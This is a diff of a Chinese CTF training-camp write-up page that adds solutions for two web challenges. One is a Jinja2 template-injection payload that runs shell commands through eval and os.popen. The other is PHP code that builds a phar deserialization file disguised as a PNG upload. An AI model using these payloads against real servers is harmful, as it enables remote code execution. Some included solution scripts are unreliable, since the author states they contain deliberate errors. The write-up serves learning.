@@ -45,7 +45,7 @@ Web 0x01 第一次冒险 ​	按照网页提示操作，最后结合提示在coo
         "mainEntityOfPage": {
             "@type": "WebPage",
             "@id": "http:\/\/sh11no.github.io\/cnsssummer\/"
-        },"genre": "posts","wordcount":  504 ,
+        },"genre": "posts","wordcount":  620 ,
         "url": "http:\/\/sh11no.github.io\/cnsssummer\/","datePublished": "2021-08-20T13:36:08+08:00","dateModified": "2021-08-20T13:36:08+08:00","publisher": {
             "@type": "Organization",
             "name": ""},"author": {
@@ -122,7 +122,7 @@ Web 0x01 第一次冒险 ​	按照网页提示操作，最后结合提示在coo
             <div class="toc-content" id="toc-content-auto"></div>
         </div><article class="page single"><h1 class="single-title animated flipInX">CNSS2021夏令营游记</h1><div class="post-meta">
             <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw"></i>Shino</a></span></div>
-            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2021-08-20">2021-08-20</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 504 字&nbsp;
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2021-08-20">2021-08-20</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 620 字&nbsp;
                 <i class="far fa-clock fa-fw"></i>&nbsp;预计阅读 3 分钟&nbsp;</div>
         </div><div class="details toc" id="toc-static"  kept="true">
                 <div class="details-summary toc-title">
@@ -138,6 +138,8 @@ Web 0x01 第一次冒险 ​	按照网页提示操作，最后结合提示在coo
         <li><a href="#0x02-更简单的计算题">0x02 更简单的计算题</a></li>
         <li><a href="#0x03-卖菜刀">0x03 卖菜刀</a></li>
         <li><a href="#0x04-最好的语言">0x04 最好的语言？</a></li>
+        <li><a href="#0x05-你要玩蛇吗">0x05 你要玩蛇吗</a></li>
+        <li><a href="#0x06-给我康康你的照片">0x06 给我康康你的照片</a></li>
       </ul>
     </li>
     <li><a href="#reverse">Reverse</a>
@@ -248,6 +250,91 @@ Web 0x01 第一次冒险 ​	按照网页提示操作，最后结合提示在coo
 </code></pre></td></tr></table>
 </div>
 </div><p>传入$interesting变量得到flag。</p>
+<h3 id="0x05-你要玩蛇吗">0x05 你要玩蛇吗</h3>
+<p>看到蛇，猜想和<del>Arcaea</del>Python有关。点进去用眼睛瞪，发现网页GET了一个name字段并显示在网页上。</p>
+<p>使用BurpSuite的Repeater功能看到有一个Server：gunicorn字样，谷歌一下发现确实是一个python的webserver，猜测入手点是python。</p>
+<p>众所周知（其实是别人告诉我的），有一个优秀的python web框架叫Flask，默认使用jinja引擎。熟练运用搜索引擎获得一个漏洞示例（下已改为题目格式）</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="k">def</span> <span class="nf">cum</span><span class="p">(</span><span class="n">name</span><span class="p">):</span>
+	<span class="n">tp</span> <span class="o">=</span> <span class="s1">&#39;{{name}}超喜欢玩蛇哦&#39;</span>
+	<span class="k">return</span> <span class="n">render_template_string</span><span class="p">(</span><span class="n">tp</span><span class="p">,</span> <span class="n">name</span><span class="o">=</span><span class="n">name</span><span class="p">)</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>其中render_template_string是jinja引擎的模板渲染函数。其中{{name}}表示name变量的值。那么如果我在浏览器地址栏中令/?name={{Fuc1()}}( 其中Fuc1()是一个函数)会发生什么呢？</p>
+<p><strong>函数Fuc1()的返回值将会显示在页面中</strong></p>
+<p>接下来几步涉及Python基础。</p>
+<ol>
+<li><code>__globals__</code>：每个python函数都含有一个<code>__globals__</code>字典，存储“在本函数中可以存储的全局变量”列表。其中一定有一个<code>__builtins__</code>变量。</li>
+<li><code>__builtins__</code>：我们知道，Python 需要 import 才能引用其他包的函数。但由于一部分函数实在过于常用，所以无需引入也能用。它们就是 <code>__builtins__</code> 字典中的函数。
+比如： <code>print, open, chr, len, abs, eval</code></li>
+<li><code>eval</code>：Python的<code>eval</code>是把一个字符串当作代码来执行。</li>
+</ol>
+<p>也就是我们需要找到一个函数<code>fun</code>，调用<code>fun.__globals__['__builtins__']['eval']()</code>即可在网站上执行任意代码。</p>
+<p>如何找到一个函数呢？搜索得到flask框架中有一个可以直接调用的函数<code>url_for()</code>。</p>
+<p>那么我们需要执行什么代码呢？有如下语句：</p>
+<p><code>__import__(&quot;os&quot;).popen(&quot;...&quot;).read()</code></p>
+<p>作用是引入os并调用，返回程序输出。试试直接<code>cat</code>一下<code>flag</code>？</p>
+<p><code>/?name={{url_for.__globals__['__builtins__']['eval'](__import__(&quot;os&quot;).popen(&quot;cat flag&quot;).read())}}</code></p>
+<p>发现页面上出现了flag，好神奇哦。</p>
+<h3 id="0x06-给我康康你的照片">0x06 给我康康你的照片</h3>
+<p>其实我开这题只是想看看有没有别的小可爱传照片，但是其实看不到，恼火。</p>
+<p>我实在做不出来，索性使用中国御剑扫描网站目录看到有一个robots.txt文件，点进去发现让我访问s3cr3t.php，立即访问。</p>
+<p>其实正确做法是F12看到源码中有一段注释内含“机器人”字样想到访问robots.txt</p>
+<p>进行代码审计，发现GET了一个<code>$interesting</code>变量，并将其作为文件路径，将文件内容读入到<code>$file</code>中。由于<code>file_get_contents()</code>的返回值不是空就是字符串，我们无法在返回值上做手脚。考虑搞一个在访问时触发的木马。</p>
+<p>考虑构造一个<code>phar</code>文件，在读取时利用<code>phar://</code>伪协议直接执行其中代码。参照<code>0x04 最好的语言？</code>题，我们需要构造一个Flag类型对象并赋值好初始值写入<code>phar</code>中，利用<code>__destruct()</code>函数输出<code>flag</code>。</p>
+<p>谷歌一个<code>phar</code>文件构造代码，直接进行一个使用：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
+    <span class="k">class</span> <span class="nc">Flag</span> <span class="p">{</span>
+    <span class="k">public</span> <span class="nv">$a</span><span class="p">;</span>
+    <span class="k">protected</span> <span class="nv">$b</span><span class="p">;</span>
+    <span class="k">private</span> <span class="nv">$c</span><span class="p">;</span>
+
+    <span class="k">function</span> <span class="fm">__construct</span><span class="p">()</span> <span class="p">{</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">a</span> <span class="o">=</span> <span class="s1">&#39;1&#39;</span><span class="p">;</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">b</span> <span class="o">=</span> <span class="s1">&#39;2&#39;</span><span class="p">;</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">c</span> <span class="o">=</span> <span class="s1">&#39;3&#39;</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="p">}</span>
+    <span class="nv">$phar</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Phar</span><span class="p">(</span><span class="s2">&#34;phar.phar&#34;</span><span class="p">);</span>
+    <span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">startBuffering</span><span class="p">();</span>
+    <span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">setStub</span><span class="p">(</span><span class="s2">&#34;&lt;?php __HALT_COMPILER(); ?&gt;&#34;</span><span class="p">);</span>
+    <span class="nv">$o</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Flag</span><span class="p">();</span>
+    <span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">setMetadata</span><span class="p">(</span><span class="nv">$o</span><span class="p">);</span>
+    <span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">stopBuffering</span><span class="p">();</span>
+<span class="cp">?&gt;</span><span class="err">
+</span></code></pre></td></tr></table>
+</div>
+</div><p>执行得到phar.phar文件，后缀名改为<code>png</code>上传。</p>
+<p>访问<code>/s3cr3t.php?interesting=phar://./upload/.../...png</code>，发现页面上出现了flag，好神奇哦。</p>
 <h2 id="reverse">Reverse</h2>
 <h3 id="0x01-hello-reverse">0x01 Hello Reverse</h3>
 <p>​		使用ida反编译后即可看到flag</p>
@@ -285,6 +372,7 @@ Web 0x01 第一次冒险 ​	按照网页提示操作，最后结合提示在coo
 </span><span class="lnt">16
 </span><span class="lnt">17
 </span><span class="lnt">18
+</span><span class="lnt">19
 </span></code></pre></td>
 <td class="lntd">
 <pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="cp">#include</span> <span class="cpf">&lt;bits/stdc++.h&gt;</span><span class="cp">
@@ -305,7 +393,8 @@ Web 0x01 第一次冒险 ​	按照网页提示操作，最后结合提示在coo
         <span class="n">ans</span> <span class="o">+=</span> <span class="p">(</span><span class="mi">1</span> <span class="o">-</span> <span class="n">notp</span><span class="p">[</span><span class="n">i</span><span class="p">])</span> <span class="o">*</span> <span class="n">i</span> <span class="o">*</span> <span class="n">i</span><span class="p">;</span>
     <span class="n">printf</span><span class="p">(</span><span class="s">&#34;%lld</span><span class="se">\n</span><span class="s">&#34;</span> <span class="n">ans</span><span class="p">);</span>
 <span class="p">}</span>
-</code></pre></td></tr></table>
+<span class="c1">//这份代码有一些小错误，直接抄写跑不出答案的哦！但是代码逻辑完全正确
+</span></code></pre></td></tr></table>
 </div>
 </div><h3 id="eeeeeezrsa">eeeeeezrsa</h3>
 <p>​	通过RSA解码方式直接求得即可。</p>
@@ -379,6 +468,8 @@ $$
 </span><span class="lnt">20
 </span><span class="lnt">21
 </span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
 </span></code></pre></td>
 <td class="lntd">
 <pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">random</span>
@@ -388,7 +479,7 @@ $$
 
 <span class="n">w</span> <span class="o">=</span> <span class="mi">0</span>
 <span class="k">def</span> <span class="nf">MUL</span><span class="p">(</span><span class="n">ax</span><span class="p">,</span> <span class="n">ay</span><span class="p">,</span> <span class="n">bx</span><span class="p">,</span> <span class="n">by</span><span class="p">):</span>
-	<span class="k">return</span> <span class="p">(</span><span class="n">ax</span> <span class="o">*</span> <span class="n">bx</span> <span class="o">%</span> <span class="n">p</span> <span class="o">+</span> <span class="n">ay</span> <span class="o">*</span> <span class="n">by</span> <span class="o">%</span> <span class="n">p</span> <span class="o">*</span> <span class="n">w</span> <span class="o">%</span> <span class="n">p</span><span class="p">)</span> <span class="o">%</span> <span class="n">p</span><span class="p">,</span> <span class="p">(</span><span class="n">ax</span> <span class="o">*</span> <span class="n">by</span> <span class="o">%</span> <span class="n">p</span> <span class="o">+</span> <span class="n">ay</span> <span class="o">*</span> <span class="n">bx</span> <span class="o">%</span> <span class="n">p</span><span class="p">)</span> <span class="o">%</span> <span class="n">p</span>
+	<span class="k">return</span> <span class="p">(</span><span class="n">ax</span> <span class="o">*</span> <span class="n">bx</span> <span class="o">%</span> <span class="n">p</span> <span class="o">+</span> <span class="n">ay</span> <span class="o">*</span> <span class="n">by</span> <span class="o">*</span> <span class="n">w</span> <span class="o">%</span> <span class="n">p</span><span class="p">)</span> <span class="o">%</span> <span class="n">p</span><span class="p">,</span> <span class="p">(</span><span class="n">ax</span> <span class="o">*</span> <span class="n">by</span> <span class="o">%</span> <span class="n">p</span> <span class="o">+</span> <span class="n">ay</span> <span class="o">*</span> <span class="n">bx</span> <span class="o">%</span> <span class="n">p</span><span class="p">)</span> <span class="o">%</span> <span class="n">p</span>
 
 <span class="k">def</span> <span class="nf">power</span><span class="p">(</span><span class="n">x</span><span class="p">,</span> <span class="n">y</span><span class="p">,</span> <span class="n">b</span><span class="p">):</span>
 	<span class="n">ax</span><span class="p">,</span> <span class="n">ay</span> <span class="o">=</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">0</span>
@@ -403,6 +494,8 @@ $$
 	<span class="n">w</span> <span class="o">=</span> <span class="p">((</span><span class="n">a</span> <span class="o">*</span> <span class="n">a</span> <span class="o">%</span> <span class="n">p</span> <span class="o">-</span> <span class="n">n</span><span class="p">)</span> <span class="o">%</span> <span class="n">p</span> <span class="o">+</span> <span class="n">p</span><span class="p">)</span> <span class="o">%</span> <span class="n">p</span>
 	<span class="k">if</span> <span class="nb">pow</span><span class="p">(</span><span class="n">w</span><span class="p">,</span> <span class="p">(</span><span class="n">p</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span><span class="o">//</span><span class="mi">2</span><span class="p">,</span> <span class="n">p</span><span class="p">)</span> <span class="o">==</span> <span class="n">p</span><span class="o">-</span><span class="mi">1</span><span class="p">:</span> <span class="k">break</span>
 <span class="nb">print</span><span class="p">(</span><span class="n">p</span> <span class="o">-</span> <span class="n">power</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="p">(</span><span class="n">p</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span><span class="o">//</span><span class="mi">2</span><span class="p">))</span>
+
+<span class="c1">#这份代码有一些小错误，直接抄写跑不出答案的哦！但是代码逻辑完全正确</span>
 </code></pre></td></tr></table>
 </div>
 </div><p>这个数超过了C++能存的范围了（除非写高精），所以被迫写了python。</p>
